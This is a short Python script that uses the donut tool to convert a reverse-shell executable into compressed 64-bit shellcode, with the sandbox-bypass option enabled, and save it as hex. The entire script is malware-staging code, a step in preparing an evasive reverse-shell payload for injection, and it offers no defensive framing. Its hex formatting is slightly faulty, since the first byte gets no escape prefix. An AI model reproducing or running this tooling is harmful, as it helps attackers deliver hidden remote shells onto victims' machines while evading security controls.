from donut import create

# Path to the executable
exe_path = "revshell_pyinstaller.exe"

# Generate optimized shellcode
shellcode = create(
    file=exe_path,
    arch=2,            # Target 64-bit architecture
    bypass=3,          # Enable advanced sandbox bypass
    compress=True      # Enable compression for smaller size
)

# Save shellcode in hexadecimal format
with open("shellcode.hex", "w") as f:
    shellcode_hex = "\\x".join(f"{byte:02x}" for byte in shellcode)
    f.write(shellcode_hex)

print("Shellcode saved to shellcode.hex!")